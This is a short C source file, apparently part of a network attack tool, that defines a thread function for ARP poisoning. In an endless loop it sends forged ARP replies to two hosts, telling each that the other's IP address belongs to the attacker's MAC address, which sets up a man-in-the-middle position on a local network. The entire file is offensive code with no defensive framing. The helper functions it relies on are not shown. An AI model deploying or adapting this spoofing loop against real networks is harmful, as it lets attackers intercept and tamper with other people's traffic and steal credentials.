#include "../include/arp.h"

// Does arp-poisoning

void *arp_poison(void *arg_ptr) 
{
    struct poison_pass *pass_poison = (struct poison_pass *)arg_ptr;

    while(1) 
    {
        //send a fake arp-reply to target 1 pretending to be target 2
        arp_reply(pass_poison->ip2, pass_poison->ip1, pass_poison->mac1, pass_poison->l);
        //send a fake arp-reply to target 2 pretending to be target 1
        arp_reply(pass_poison->ip1, pass_poison->ip2, pass_poison->mac2, pass_poison->l);
        sleep(1);
    }
}
